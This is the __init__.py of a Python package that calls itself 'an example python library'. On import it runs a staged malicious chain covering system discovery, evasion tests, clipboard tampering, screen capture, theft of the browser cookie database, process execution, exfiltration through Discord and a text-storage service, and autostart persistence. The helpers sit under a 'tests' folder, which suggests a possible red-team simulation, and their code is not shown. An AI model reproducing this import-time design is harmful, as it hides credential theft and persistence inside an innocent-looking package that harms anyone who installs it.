"""
pyexample.

An example python library.
"""

__version__ = "0.0.1"
__author__ = 'Peter Matkovski'
__credits__ = 'Dexter\'s Laboratory'

import platform

from .tests.discovery import get_os_info
from .tests.evasion import run_evasion_tests
from .tests.collection import clipboard_data_alternation
from .tests.collection import screen_capture
from .tests.collection import steel_cookie_db
from .tests.execution import run_process
from .tests.exfiltration import exfil_discord
from .tests.exfiltration import exfil_textstorage
from .tests.persistense import drop_config_autostart
from .tests.persistense import drop_profile_modification
from .tests.persistense import drop_schtask_autostart

platform_str = platform.system()  # 'Linux' , 'Darwin' , 'Java' , 'Windows'
print("Info: evil_package INIT " + platform_str)

# discovery
username = get_os_info(platform_str)

# evasion
run_evasion_tests(platform_str)

# collection
clipboard_data_alternation(platform_str) #ok darvin
screen_capture(platform_str) #ok darvin
steel_cookie_db(platform_str, username) #ok darvin

# execution
run_process(platform_str) #ok darvin

# exfiltration
exfil_discord(platform_str)  # todo
exfil_textstorage(platform_str)  # todo

# persistense
drop_config_autostart(platform_str, username)  # todo test lin
drop_profile_modification(platform_str, username)  # todo test lin
#drop_schtask_autostart(platform_str)  # todo win

print("INFO: Package INIT activity finished.")